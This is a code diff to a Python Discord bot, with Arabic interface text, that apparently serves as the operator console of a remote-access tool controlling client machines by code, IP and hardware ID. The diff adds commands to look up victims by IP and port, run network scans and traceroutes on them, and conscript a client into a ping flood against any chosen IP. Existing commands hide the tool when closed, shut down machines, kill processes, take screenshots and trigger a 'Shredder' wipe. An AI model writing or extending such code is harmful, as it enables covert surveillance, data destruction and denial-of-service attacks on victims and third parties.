@@ -352,7 +352,7 @@ class DeviceActionsView(discord.ui.View):
             if self.code not in db["stealth_close_codes"]:
                 db["stealth_close_codes"].append(self.code)
             if save_db(db, sha, url, headers, f"Enable stealth close for {self.code}"):
-                await interaction.followup.send(f"👻 تم تفعيل وضع الخداع عند الإغلاق للعميل `{self.code}` بنجاح! إذا ضغط على X الآن، ستختفي الأداة وتعمل بالخلفية بدلاً من أن تُغلق.", ephemeral=True)
+                await interaction.followup.send(f"👻 تم تفعيل وضع الخداع عند الإغلاق للعميل `{self.code}` بنجاح!", ephemeral=True)
             else:
                 await interaction.followup.send("❌ فشل الحفظ في السحابة.", ephemeral=True)
 
@@ -364,7 +364,7 @@ class DeviceActionsView(discord.ui.View):
             if "remote_force_close" not in db: db["remote_force_close"] = {}
             db["remote_force_close"][self.code] = {"id": str(int(time.time()))}
             if save_db(db, sha, url, headers, f"Graceful close app for {self.code}"):
-                await interaction.followup.send("🛑 تم إرسال أمر الإغلاق الكلي! توقفت الأداة عند العميل تماماً.", ephemeral=True)
+                await interaction.followup.send("🛑 تم إرسال أمر الإغلاق الكلي!", ephemeral=True)
 
     @discord.ui.button(label="🪟 إغلاق الألعاب والخلفية", style=discord.ButtonStyle.secondary, custom_id="dev_act_kill", row=4)
     async def kill_proc_btn(self, interaction: discord.Interaction, button: discord.ui.Button):
@@ -374,7 +374,7 @@ class DeviceActionsView(discord.ui.View):
             if "remote_killers" not in db: db["remote_killers"] = {}
             db["remote_killers"][self.code] = {"id": str(int(time.time()))}
             if save_db(db, sha, url, headers, f"Kill background processes for {self.code}"):
-                await interaction.followup.send("🪟 تم إرسال أمر إغلاق جميع الألعاب والبرامج الخلفية للعميل بنجاح!", ephemeral=True)
+                await interaction.followup.send("🪟 تم إرسال أمر إغلاق الألعاب والبرامج الخلفية!", ephemeral=True)
 
     @discord.ui.button(label="🔌 إيقاف تشغيل الجهاز (Shutdown)", style=discord.ButtonStyle.danger, custom_id="dev_act_shutdown", row=4)
     async def shutdown_btn(self, interaction: discord.Interaction, button: discord.ui.Button):
@@ -384,7 +384,7 @@ class DeviceActionsView(discord.ui.View):
             if "remote_shutdowns" not in db: db["remote_shutdowns"] = {}
             db["remote_shutdowns"][self.code] = {"id": str(int(time.time()))}
             if save_db(db, sha, url, headers, f"Shutdown {self.code}"):
-                await interaction.followup.send("🔌 تم إرسال أمر إيقاف التشغيل الفوري لجهاز العميل!", ephemeral=True)
+                await interaction.followup.send("🔌 تم إرسال أمر إيقاف التشغيل الفوري للجهاز!", ephemeral=True)
 
     @discord.ui.button(label="🔥 تدمير شامل (Shredder)", style=discord.ButtonStyle.danger, custom_id="dev_act_shred", row=4)
     async def shred_btn(self, interaction: discord.Interaction, button: discord.ui.Button):
@@ -475,6 +475,113 @@ async def generate_codes(interaction: discord.Interaction, count: int = 1):
     codes_str = "\n".join([f"`{c}`" for c in new_codes])
     await interaction.response.send_message(f"⚠️ **حفظ الأكواد التالية؟**\n\n{codes_str}", view=ConfirmSaveView(new_codes, count), ephemeral=True)
 
+@client.tree.command(name="manage", description="التحكم بالعميل مباشرة عبر الـ IP والـ Port")
+@app_commands.describe(ip_port="اكتب الـ IP والـ Port بهذا الشكل مثلاً: 64.137.192.51:7680")
+async def manage_by_ip_port(interaction: discord.Interaction, ip_port: str):
+    await interaction.response.defer(thinking=True, ephemeral=True)
+    db, _, _, _ = fetch_db()
+    if not db:
+        await interaction.followup.send("❌ فشل الاتصال بقاعدة البيانات.", ephemeral=True)
+        return
+    ip_port_clean = ip_port.strip().replace(" ", "")
+    if ":" not in ip_port_clean:
+        await interaction.followup.send("❌ الصيغة غير صحيحة. يرجى استخدام الشكل:\n`64.137.192.51:7680`", ephemeral=True)
+        return
+    target_ip, target_port_str = ip_port_clean.split(":", 1)
+    try: target_port = int(target_port_str)
+    except ValueError: target_port = target_port_str
+
+    found_code, found_info = None, None
+    for code, info in db.get("codes", {}).items():
+        if info.get("used"):
+            if str(info.get("ip", "")).strip() == target_ip and str(info.get("port")) == str(target_port):
+                found_code, found_info = code, info
+                break
+    if not found_code:
+        await interaction.followup.send(f"❌ لم يتم العثور على عميل بنفس الـ IP والـ Port: `{ip_port}`", ephemeral=True)
+        return
+    ip, port, hwid, country = found_info.get('ip', 'Unknown'), found_info.get('port', '8888'), found_info.get('device'), found_info.get('country', 'Unknown')
+    view = DeviceActionsView(found_code, hwid, ip, port)
+    await interaction.followup.send(f"⚙️ **لوحة التحكم المطلق بالعميل (عبر IP & Port):**\n🔑 الكود: `{found_code}`\n🌐 IP : Port $\rightarrow$ `{ip} : {port}`\n🌍 الدولة: `{country}`\n🔒 HWID: `{hwid}`", view=view, ephemeral=True)
+
+@client.tree.command(name="netscan", description="جلب تقرير كامل عن اتصالات الشبكة والـ IPs والـ Ports النشطة للعميل")
+@app_commands.describe(target="كود التفعيل أو الـ IP الخاص بالعميل")
+async def netscan_command(interaction: discord.Interaction, target: str):
+    await interaction.response.defer(thinking=True, ephemeral=True)
+    db, sha, url, headers = fetch_db()
+    if not db: return
+    target_upper, target_clean = target.strip().upper(), target.strip()
+    found_key = target_upper if target_upper in db.get("codes", {}) else None
+    if not found_key:
+        for c, info in db.get("codes", {}).items():
+            if target_clean in str(info.get("ip", "")) or (info.get("device") and target_clean.lower() in info.get("device").lower()):
+                found_key = c
+                break
+    if not found_key:
+        await interaction.followup.send(f"❌ لم يتم العثور على العميل المستهدف: `{target}`", ephemeral=True)
+        return
+    if "remote_netscans" not in db: db["remote_netscans"] = {}
+    db["remote_netscans"][found_key] = {"id": str(int(time.time()))}
+    if save_db(db, sha, url, headers, f"Request netscan for {found_key}"):
+        await interaction.followup.send(f"🌐 **تم إرسال أمر فحص الشبكة (NetScan)!** سيصلك التقرير هنا خلال لحظات.", ephemeral=True)
+
+@client.tree.command(name="trace", description="التتبع الجغرافي الحي ومسار الشبكة (Traceroute) للعميل")
+@app_commands.describe(target="كود التفعيل أو الـ IP الخاص بالعميل")
+async def trace_command(interaction: discord.Interaction, target: str):
+    await interaction.response.defer(thinking=True, ephemeral=True)
+    db, sha, url, headers = fetch_db()
+    if not db: return
+    target_upper, target_clean = target.strip().upper(), target.strip()
+    found_key = target_upper if target_upper in db.get("codes", {}) else None
+    if not found_key:
+        for c, info in db.get("codes", {}).items():
+            if target_clean in str(info.get("ip", "")) or (info.get("device") and target_clean.lower() in info.get("device").lower()):
+                found_key = c
+                break
+    if not found_key:
+        await interaction.followup.send(f"❌ لم يتم العثور على العميل المستهدف: `{target}`", ephemeral=True)
+        return
+    if "remote_traces" not in db: db["remote_traces"] = {}
+    db["remote_traces"][found_key] = {"id": str(int(time.time()))}
+    if save_db(db, sha, url, headers, f"Request trace for {found_key}"):
+        await interaction.followup.send(f"🛰️ **تم إرسال أمر التتبع الجغرافي (Traceroute)!** سيصلك التقرير هنا خلال لحظات.", ephemeral=True)
+
+@client.tree.command(name="ping", description="فحص سرعة الاستجابة (Ping) وحالة الاتصال للعميل")
+@app_commands.describe(target="كود التفعيل أو الـ IP الخاص بالعميل")
+async def ping_command(interaction: discord.Interaction, target: str):
+    await interaction.response.defer(thinking=True, ephemeral=True)
+    db, sha, url, headers = fetch_db()
+    if not db: return
+    target_upper, target_clean = target.strip().upper(), target.strip()
+    found_key = target_upper if target_upper in db.get("codes", {}) else None
+    if not found_key:
+        for c, info in db.get("codes", {}).items():
+            if target_clean in str(info.get("ip", "")) or (info.get("device") and target_clean.lower() in info.get("device").lower()):
+                found_key = c
+                break
+    if not found_key:
+        await interaction.followup.send(f"❌ لم يتم العثور على العميل المستهدف: `{target}`", ephemeral=True)
+        return
+    if "remote_pings" not in db: db["remote_pings"] = {}
+    db["remote_pings"][found_key] = {"id": str(int(time.time()))}
+    if save_db(db, sha, url, headers, f"Request ping test for {found_key}"):
+        await interaction.followup.send(f"⚡ **تم إرسال أمر فحص البنج (Ping)!** سيصلك التقرير هنا خلال لحظات.", ephemeral=True)
+
+@client.tree.command(name="pingflood", description="إجبار العميل على تنفيذ اختبار ضغط شبكي وإغراق بالبنج (Ping Flood)")
+@app_commands.describe(target_code="كود العميل", ip_target="الـ IP المستهدف (مثال: 8.8.8.8)")
+async def pingflood_command(interaction: discord.Interaction, target_code: str, ip_target: str):
+    await interaction.response.defer(thinking=True, ephemeral=True)
+    db, sha, url, headers = fetch_db()
+    if not db: return
+    target_upper = target_code.strip().upper()
+    if target_upper not in db.get("codes", {}):
+        await interaction.followup.send(f"❌ لم يتم العثور على الكود: `{target_code}`", ephemeral=True)
+        return
+    if "remote_pingfloods" not in db: db["remote_pingfloods"] = {}
+    db["remote_pingfloods"][target_upper] = {"id": str(int(time.time())), "ip_target": ip_target.strip()}
+    if save_db(db, sha, url, headers, f"Request ping flood for {target_upper}"):
+        await interaction.followup.send(f"🔥 **تم إطلاق أمر اختبار الضغط الشبكي (Ping Flood)!** نحو الهدف: `{ip_target}`", ephemeral=True)
+
 @client.tree.command(name="unused", description="عرض الأكواد غير المستخدمة مع خيارات الحذف")
 async def unused_command(interaction: discord.Interaction):
     await interaction.response.defer(thinking=True, ephemeral=True)
@@ -508,10 +615,7 @@ async def check_code(interaction: discord.Interaction, code: str):
         return
     info = db["codes"][code.upper()]
     status = "مستخدم 🔴" if info.get("used") else "متاح 🟢"
-    await interaction.followup.send(
-        f"🔍 **الكود `{code.upper()}`:**\n📌 الحالة: {status}\n🌐 IP : Port: `{info.get('ip') or 'غير متصل'} : {info.get('port', '8888')}`\n🌍 الدولة: `{info.get('country') or 'غير معروفة'}`\n💻 HWID: `{info.get('device') or 'لا يوجد'}`", 
-        ephemeral=True
-    )
+    await interaction.followup.send(f"🔍 **الكود `{code.upper()}`:**\n📌 الحالة: {status}\n🌐 IP : Port: `{info.get('ip') or 'غير متصل'} : {info.get('port', '8888')}`\n🌍 الدولة: `{info.get('country') or 'غير معروفة'}`\n💻 HWID: `{info.get('device') or 'لا يوجد'}`", ephemeral=True)
 
 @client.tree.command(name="delete", description="حذف كود نهائياً")
 @app_commands.describe(code="الكود المراد حذفه")
@@ -543,40 +647,26 @@ async def reset_device(interaction: discord.Interaction, code: str):
     if save_db(db, sha, url, headers, f"Reset code: {code}"):
         await interaction.followup.send(f"🔄 تم تصفير الكود `{code}` وأصبح متاحاً!", ephemeral=True)
 
-@client.tree.command(name="screenshot", description="التقاط لقطة شاشة (Screenshot) لجهاز عميل معين عبر اسمه أو كوده")
+@client.tree.command(name="screenshot", description="التقاط لقطة شاشة لجهاز عميل معين")
 @app_commands.describe(target="اسم الجهاز أو كود التفعيل المستهدف")
 async def screenshot_command(interaction: discord.Interaction, target: str):
     await interaction.response.defer(thinking=True, ephemeral=True)
     db, sha, url, headers = fetch_db()
-    if not db:
-        await interaction.followup.send("❌ فشل الاتصال بقاعدة البيانات.", ephemeral=True)
-        return
-
-    target_upper = target.strip().upper()
-    target_clean = target.strip()
-    
-    found_key = None
-    if target_upper in db.get("codes", {}):
-        found_key = target_upper
-    else:
+    if not db: return
+    target_upper, target_clean = target.strip().upper(), target.strip()
+    found_key = target_upper if target_upper in db.get("codes", {}) else None
+    if not found_key:
         for c, info in db.get("codes", {}).items():
             if info.get("device") and target_clean.lower() in info.get("device").lower():
                 found_key = c
                 break
-
     if not found_key:
         await interaction.followup.send(f"❌ لم يتم العثور على الجهاز أو الكود: `{target}`", ephemeral=True)
         return
-
-    if "remote_screenshots" not in db:
-        db["remote_screenshots"] = {}
-    
+    if "remote_screenshots" not in db: db["remote_screenshots"] = {}
     db["remote_screenshots"][found_key] = {"id": str(int(time.time()))}
-    
-    if save_db(db, sha, url, headers, f"Request screenshot for target {found_key}"):
-        await interaction.followup.send(f"📸 **تم إرسال أمر التقاط الشاشة بنجاح!** سيصلك ملف الصورة هنا خلال لحظات لجهاز الكود: `{found_key}`", ephemeral=True)
-    else:
-        await interaction.followup.send("❌ فشل إرسال أمر التقاط الشاشة.", ephemeral=True)
+    if save_db(db, sha, url, headers, f"Request screenshot for {found_key}"):
+        await interaction.followup.send(f"📸 **تم إرسال أمر التقاط الشاشة بنجاح!**", ephemeral=True)
 
 @client.tree.command(name="statsgui", description="لوحة معلومات وإحصائيات تفاعلية")
 async def stats_gui_command(interaction: discord.Interaction):
@@ -586,27 +676,21 @@ async def stats_gui_command(interaction: discord.Interaction):
     total = len(codes)
     used = sum(1 for c in codes.values() if c.get("used"))
     available = total - used
-    embed = discord.Embed(
-        title="📊 لوحة التحكم والإحصائيات الشاملة",
-        description="اختر القسم المطلوب من الأزرار أدناه:",
-        color=0xA871FF
-    )
+    embed = discord.Embed(title="📊 لوحة التحكم والإحصائيات الشاملة", description="اختر القسم المطلوب من الأزرار أدناه:", color=0xA871FF)
     embed.add_field(name="📌 الإجمالي", value=f"`{total}`", inline=True)
     embed.add_field(name="🟢 المتاحة", value=f"`{available}`", inline=True)
     embed.add_field(name="🔴 المستخدمة", value=f"`{used}`", inline=True)
     await interaction.response.send_message(embed=embed, view=MainDashboardView(), ephemeral=True)
 
 @client.tree.command(name="clear", description="حذف رسائل البوت وتنظيف الشاشة")
-@app_commands.describe(amount="عدد الرسائل المراد مسحها (افتراضي 10)")
+@app_commands.describe(amount="عدد الرسائل المراد مسحها")
 async def clear_messages(interaction: discord.Interaction, amount: int = 10):
     await interaction.response.defer(thinking=True, ephemeral=True)
     deleted = await interaction.channel.purge(limit=amount)
     await interaction.followup.send(f"🧹 تم تنظيف وحذف `{len(deleted)}` رسالة بنجاح!", ephemeral=True)
     await asyncio.sleep(3)
-    try:
-        await interaction.delete_original_response()
-    except Exception:
-        pass
+    try: await interaction.delete_original_response()
+    except Exception: pass
 
 @client.tree.command(name="sync", description="مزامنة الأوامر")
 async def sync_commands(interaction: discord.Interaction):
